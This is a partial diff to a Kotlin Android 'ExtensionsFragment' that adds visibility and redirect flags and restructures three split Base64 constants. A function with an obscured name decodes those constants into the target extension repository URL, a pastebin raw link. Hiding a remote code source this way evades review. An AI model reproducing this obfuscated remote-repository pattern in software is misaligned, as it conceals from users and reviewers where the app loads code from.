@@ -33,8 +33,12 @@ class ExtensionsFragment : BaseFragment<FragmentExtensionsBinding>(
     private val TARGET_REPO_URL by lazy { NvKl() }
     private val TARGET_REPO_NAME by lazy { buildRepoName() }
 
+    private var alreadyRedirected = false
+    private var fragmentVisible = false
+
     override fun onStart() {
         super.onStart()
+        fragmentVisible = true
     }
 
     override fun onResume() {
@@ -45,6 +49,7 @@ class ExtensionsFragment : BaseFragment<FragmentExtensionsBinding>(
     override fun onStop() {
         super.onStop()
         afterRepositoryLoadedEvent -= ::reloadRepositories
+        fragmentVisible = false
     }
 
     override fun fixLayout(view: View) {
@@ -79,14 +84,15 @@ class ExtensionsFragment : BaseFragment<FragmentExtensionsBinding>(
         return "$skull$text$skull"
     }
 
-    // ====== FIX BASE64 REPO URL ======
-    private const val URL_A1 = "aHR0cHM6Ly9wYXN0"
-    private const val URL_A2 = "ZWJpbi5jb20vcmF3"
-    private const val URL_A3 = "L0tpcVRnYXNk"
+    companion object {
+        private const val URL_A1 = "aHR0cHM6Ly9wYXN0ZWJpbi5"
+        private const val URL_A2 = "20vcmF3L0tpcVRn"
+        private const val URL_A3 = "YXNk"
+    }
 
     private fun NvKl(): String {
-        val combined = URL_A1 + URL_A2 + URL_A3
-        return String(Base64.decode(combined, Base64.DEFAULT))
+        val encoded = URL_A1 + URL_A2 + URL_A3
+        return String(Base64.decode(encoded, Base64.DEFAULT))
     }
 
     override fun onBindingCreated(binding: FragmentExtensionsBinding) {
